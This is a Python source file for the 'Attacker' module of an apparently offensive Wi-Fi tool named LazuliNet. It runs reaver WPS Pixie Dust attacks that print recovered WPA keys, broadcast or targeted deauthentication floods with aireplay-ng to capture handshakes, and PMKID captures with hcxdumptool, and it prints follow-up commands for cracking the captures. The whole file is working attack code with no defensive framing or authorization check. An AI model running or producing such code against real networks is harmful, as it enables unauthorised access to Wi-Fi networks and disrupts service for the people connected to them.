"""Attacker module for LazuliNet."""
import os
import subprocess
import time
import signal
from datetime import datetime

class Attacker:
    def __init__(self, interface, output_dir):
        self.interface = interface
        self.output_dir = output_dir
        
    def wps_attack(self, bssid, channel, pixie=True):
        """Run WPS attack with reaver."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        print(f"\n[*] Starting WPS attack on {bssid} (Channel {channel})")
        
        cmd = [
            "sudo", "reaver",
            "-i", self.interface,
            "-b", bssid,
            "-c", str(channel),
            "-vv"
        ]
        
        if pixie:
            cmd.append("-K")
            cmd.append("1")
            print("[*] Pixie Dust mode enabled")
        
        print(f"[*] Command: {' '.join(cmd)}")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                print(line, end="")
                if "WPA PSK:" in line or "AP SSID:" in line:
                    print(f"\n[!] KEY FOUND: {line.strip()}")
        except KeyboardInterrupt:
            print("\n[*] WPS attack stopped")
            process.terminate()
    
    def deauth_attack(self, bssid, channel, client=None):
        """Deauth and capture handshake."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_file = os.path.join(self.output_dir, f"capture_{timestamp}")
        
        print(f"\n[*] Starting capture on channel {channel}")
        print(f"[*] Target: {bssid}")
        
        # Start airodump-ng in background
        airodump_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", capture_file,
            self.interface
        ]
        
        airodump = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        
        # Send deauth packets
        deauth_cmd = [
            "sudo", "aireplay-ng",
            "-0", "5",
            "-a", bssid,
            self.interface
        ]
        
        if client:
            deauth_cmd.extend(["-c", client])
            print(f"[*] Targeted deauth to client: {client}")
        else:
            print("[*] Broadcast deauth")
        
        print(f"[*] Sending deauth packets...")
        subprocess.run(deauth_cmd)
        
        # Wait for handshake
        print("[*] Waiting for handshake (30 seconds)...")
        time.sleep(30)
        
        # Check if handshake was captured
        cap_file = f"{capture_file}-01.cap"
        if os.path.exists(cap_file):
            size = os.path.getsize(cap_file)
            print(f"[✓] Capture saved: {cap_file} ({size} bytes)")
            print(f"[*] To crack: python3 lazulinet.py crack --capture {cap_file}")
        else:
            print("[!] Capture file not found")
        
        airodump.terminate()
        airodump.wait()
    
    def pmkid_attack(self, bssid, channel):
        """Attempt PMKID capture."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(self.output_dir, f"pmkid_{timestamp}")
        
        print(f"\n[*] Starting PMKID attack on {bssid} (Channel {channel})")
        
        # Create filter file
        filter_file = "/tmp/lazulinet_target.txt"
        clean_bssid = bssid.replace(":", "")
        with open(filter_file, 'w') as f:
            f.write(clean_bssid)
        
        cmd = [
            "sudo", "hcxdumptool",
            "-i", self.interface,
            "-c", str(channel),
            "--filterlist", filter_file,
            "--filtermode", "2",
            "-o", f"{output_file}.pcapng",
            "--enable_status", "15"
        ]
        
        print(f"[*] Running hcxdumptool (30 seconds)...")
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            time.sleep(30)
        except KeyboardInterrupt:
            pass
        finally:
            process.terminate()
            process.wait()
        
        if os.path.exists(f"{output_file}.pcapng"):
            print(f"[✓] PMKID capture saved: {output_file}.pcapng")
            print(f"[*] Convert: hcxpcapngtool -o output.22000 {output_file}.pcapng")
        else:
            print("[!] PMKID capture failed")
